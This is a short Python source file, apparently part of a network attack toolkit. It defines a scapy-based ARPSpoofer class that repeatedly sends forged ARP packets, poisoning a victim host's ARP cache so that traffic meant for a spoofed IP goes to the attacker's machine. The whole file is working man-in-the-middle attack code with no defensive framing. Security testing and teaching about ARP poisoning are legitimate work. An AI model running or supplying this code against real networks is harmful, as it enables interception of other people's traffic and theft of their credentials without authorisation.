from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from logger import log_info, log_warning

class ARPSpoofer:
    def __init__(self, interface, mac_attacker, ip_attacker, mac_victim, ip_victim, ip_to_spoof):
        self.interface = interface
        self.mac_attacker = mac_attacker
        self.ip_attacker = ip_attacker
        self.mac_victim = mac_victim
        self.ip_victim = ip_victim
        self.ip_to_spoof = ip_to_spoof
        self.active = False
        self.spoof_interval = 2 # seconds

    def spoof(self):
        self.active = True
        while self.active:
            arp = Ether(src=self.mac_attacker) / ARP(hwsrc=self.mac_attacker, psrc=self.ip_to_spoof, hwdst=self.mac_victim, pdst=self.ip_victim)
            sendp(arp, iface=self.interface, verbose=False)
            log_info("Sent ARP packet to {} with MAC address {}".format(self.ip_victim, self.mac_victim))
            time.sleep(self.spoof_interval)

    def stop(self):
        log_warning("Stopping ARP poisoning")
        self.active = False
